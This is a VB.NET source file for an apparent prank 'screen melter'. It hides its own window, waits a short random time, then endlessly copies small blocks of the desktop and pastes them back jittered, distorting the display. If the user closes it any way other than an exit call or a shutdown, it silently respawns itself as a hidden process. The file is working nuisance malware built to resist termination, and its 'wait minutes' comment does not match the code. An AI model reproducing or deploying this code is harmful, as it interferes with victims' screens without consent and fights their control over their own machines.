Imports System
Imports System.IO
Imports System.Threading.Thread
Imports System.Runtime.InteropServices

Public Class frmMain

    ' DLL Imports
    Private Declare Auto Function GetDesktopWindow Lib "user32.dll" () As IntPtr
    Private Declare Auto Function GetWindowDC Lib "user32.dll" (ByVal hwnd As IntPtr) As IntPtr
    Private Declare Auto Function CreateCompatibleBitmap Lib "gdi32" (ByVal hdc As IntPtr, ByVal nWidth As IntPtr, ByVal nHeight As IntPtr) As IntPtr
    Private Declare Auto Function CreateCompatibleDC Lib "gdi32" (ByVal hdc As IntPtr) As IntPtr
    Private Declare Auto Function SelectObject Lib "gdi32" (ByVal hdc As IntPtr, ByVal hObject As IntPtr) As IntPtr
    Private Declare Auto Function BitBlt Lib "gdi32" (ByVal hDestDC As IntPtr, ByVal x As IntPtr, ByVal y As IntPtr, ByVal nWidth As IntPtr, ByVal nHeight As IntPtr, ByVal hSrcDC As IntPtr, ByVal xSrc As IntPtr, ByVal ySrc As IntPtr, ByVal dwRop As IntPtr) As IntPtr

    Private Const SRCCOPY = &HCC0020 ' (DWORD) dest = source
    Private MyScreenH As UInt16 = My.Computer.Screen.WorkingArea.Height
    Private MyScreenW As UInt16 = My.Computer.Screen.WorkingArea.Width
    Private x, y, T As UInt16
    Private Buffer, hBitmap, Desktop, hScreen, ScreenBuffer As Int64

    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles Me.Load
        Randomize()
        Me.Visible = True
        Me.Opacity = 0

        ' Wait T minutes
        T = (Rnd() * 3) + 1
        For i As UInt32 = 1 To T
            WaitAMin()
        Next

        ' Initialize Distortion
        Distort()

    End Sub

    Private Sub frmMain_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing

        ' Prevent form ending
        Select Case e.CloseReason
            Case CloseReason.ApplicationExitCall
                BitBlt(Desktop, 0, 0, MyScreenW, MyScreenH, hScreen, 0, 0, SRCCOPY)
            Case CloseReason.WindowsShutDown
                BitBlt(Desktop, 0, 0, MyScreenW, MyScreenH, hScreen, 0, 0, SRCCOPY)
            Case Else
                Dim pri As ProcessStartInfo = New ProcessStartInfo("MeltVB.exe")
                pri.WindowStyle = ProcessWindowStyle.Hidden
                Process.Start(pri)

        End Select

    End Sub

    Private Sub Distort()
        Desktop = GetWindowDC(GetDesktopWindow())

        ' Create a device context compatible with a known device context and assign it to a long variable
        hBitmap = CreateCompatibleDC(Desktop)
        hScreen = CreateCompatibleDC(Desktop)

        ' Create bitmaps in memory for temporary storage compatible with a known bitmap
        Buffer = CreateCompatibleBitmap(Desktop, 32, 32)
        ScreenBuffer = CreateCompatibleBitmap(Desktop, MyScreenW, MyScreenH)

        ' Assign device contexts to the bitmaps
        SelectObject(hBitmap, Buffer)
        SelectObject(hScreen, ScreenBuffer)

        ' Save the screen for later restoration
        BitBlt(hScreen, 0, 0, MyScreenW, MyScreenH, Desktop, 0, 0, SRCCOPY)

        While (1)
            Application.DoEvents()
            y = (MyScreenH) * Rnd()
            x = (MyScreenW) * Rnd()

            ' Copy 32x32 portion of screen into buffer at x,y
            BitBlt(hBitmap, 0, 0, 32, 32, Desktop, x, y, SRCCOPY)

            ' Paste back slightly shifting the values for x and y
            BitBlt(Desktop, x + (3 - 6 * Rnd()), y + (2 - 4 * Rnd()), 32, 32, hBitmap, 0, 0, SRCCOPY)
            Sleep(TimeSpan.FromMilliseconds(0.5))
        End While
    End Sub

    Private Sub WaitAMin()

        For i As UInt32 = 1 To 50
            Sleep(1)
            Application.DoEvents()
        Next
    End Sub

End Class